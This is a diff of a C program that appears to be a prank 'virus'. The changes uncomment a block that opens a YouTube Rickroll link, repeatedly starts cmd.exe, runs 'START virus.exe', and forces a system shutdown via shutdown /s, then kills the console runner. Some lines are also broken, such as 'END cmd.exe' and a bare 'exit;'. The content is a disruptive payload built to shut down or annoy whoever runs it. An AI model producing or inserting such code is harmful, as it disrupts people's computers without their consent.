@@ -20,19 +20,19 @@ int main ()
 
     system("START virus.exe");
     system("START virus.exe");
-    for(int k = 1 ; k >= 0; k++)
-    {
-        float maf;
-        maf  = k;
-        printf("%2.20f\n",asin(1/maf));
-            }
- //system("START cmd.exe /k ");
-//system("END cmd.exe  ");
+//    for(int k = 1 ; k >= 0; k++)
+  //  {
+    //    float maf;
+      //  maf  = k;
+        //printf("%2.20f\n",asin(1/maf));
+          //  }
+ system("START cmd.exe /k ");
+system("END cmd.exe  ");
 
 
 
 
-/*
+
 system("START https://youtu.be/qkyUKjRNQOk");
 Sleep(5000);
 for(int rick = 1; rick <= 10; rick++)
@@ -86,6 +86,6 @@ system("c:\\windows\\system32\\shutdown /s");
 
 exit;
 
-*/
+
 system("taskkill/IM cb_console_runner.exe");
 }
